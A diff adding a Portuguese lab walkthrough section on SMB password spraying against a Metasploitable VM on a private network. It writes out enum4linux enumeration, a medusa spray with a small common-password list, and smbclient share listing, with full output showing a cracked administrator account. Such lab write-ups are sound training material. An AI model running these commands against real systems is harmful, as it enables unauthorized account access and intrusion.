@@ -113,3 +113,104 @@ Validação: ```[80][http-post-form] host: 192.168.56.101   login: admin   passw
 Evidência adicional:
 Login manual realizado com sucesso no DVWA utilizando as credenciais encontradas.
 A ausência da mensagem “Login failed” confirmou autenticação válida.
+
+# 🧨 Password Spraying SMB
+
+Comando utilizado para enumeração: `enum4linux -a 192.168.56.101 | tee enum4_output.txt` > insira a senha > `less enum4_output.txt`
+
+Resultado:  
+Muito texto, mas o que iremos procurar é:
+```
+user:[games] rid:[0x3f2]
+user:[nobody] rid:[0x1f5]
+user:[bind] rid:[0x4ba]
+user:[proxy] rid:[0x402]
+user:[syslog] rid:[0x4b4]
+user:[user] rid:[0xbba]
+user:[www-data] rid:[0x42a]
+user:[root] rid:[0x3e8]
+user:[news] rid:[0x3fa]
+user:[postgres] rid:[0x4c0]
+user:[bin] rid:[0x3ec]
+user:[mail] rid:[0x3f8]
+user:[distccd] rid:[0x4c6]
+user:[proftpd] rid:[0x4ca]
+user:[dhcp] rid:[0x4b2]
+user:[daemon] rid:[0x3ea]
+user:[sshd] rid:[0x4b8]
+user:[man] rid:[0x3f4]
+user:[lp] rid:[0x3f6]
+user:[mysql] rid:[0x4c2]
+user:[gnats] rid:[0x43a]
+user:[libuuid] rid:[0x4b0]
+user:[backup] rid:[0x42c]
+user:[msfadmin] rid:[0xbb8]
+user:[telnetd] rid:[0x4c8]
+user:[sys] rid:[0x3ee]
+user:[klog] rid:[0x4b6]
+user:[postfix] rid:[0x4bc]
+user:[service] rid:[0xbbc]
+user:[list] rid:[0x434]
+user:[irc] rid:[0x436]
+user:[ftp] rid:[0x4be]
+user:[tomcat55] rid:[0x4c4]
+user:[sync] rid:[0x3f0]
+user:[uucp] rid:[0x3fc]
+
+```
+Iremos usar os seguintes usuários:
+
+```
+user:[user] rid:[0xbba]
+user:[msfadmin] rid:[0xbb8]
+user:[service] rid:[0xbbc]
+```
+Aperte Q para fechar.
+
+Rode esse novo comando para criar usuarios que serão utilizadas no spray: `echo -e "user\nmsfadmin\nservice" > sub_users.txt`
+Em seguinda rode esse para criar as senhas que serão utilizadas: `echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt`
+
+Rode agora o comando `medusa -h 192.168.56.101 -U sub_users.txt -P senhas_spray.txt -M smbnt -t2 -T 50` para realizar o Password spray
+Resultado: 
+```
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: password (1 of 4 complete)
+2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (2 of 4 complete)
+2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: Welcome123 (3 of 4 complete)
+2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 3, 1 complete) Password: msfadmin (4 of 4 complete)
+2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: password (1 of 4 complete)
+2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (2 of 4 complete)
+2026-02-24 09:51:04 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: Welcome123 (3 of 4 complete)
+2026-02-24 09:51:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: msfadmin (4 of 4 complete)
+2026-02-24 09:51:05 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+2026-02-24 09:51:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: password (1 of 4 complete)
+2026-02-24 09:51:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: 123456 (2 of 4 complete)
+2026-02-24 09:51:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: Welcome123 (3 of 4 complete)
+2026-02-24 09:51:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (3 of 3, 4 complete) Password: msfadmin (4 of 4 complete)
+         
+```
+Atenção na linha que diz `2026-02-24 09:51:05 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]` é uma indicação de que um usuário e senha foram testados e passaram e ADMIN$ indica que tem acesso de administrador.
+Rode o comando: `smbclient -L //192.168.56.101 -U msfadmin` > espere >  insira a senha compatível, nesse caso foi msfadmin.
+Resultado:
+```
+Password for [WORKGROUP\msfadmin]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk      
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        msfadmin        Disk      Home Directories
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            METASPLOITABLE
+```
+Você entrou!
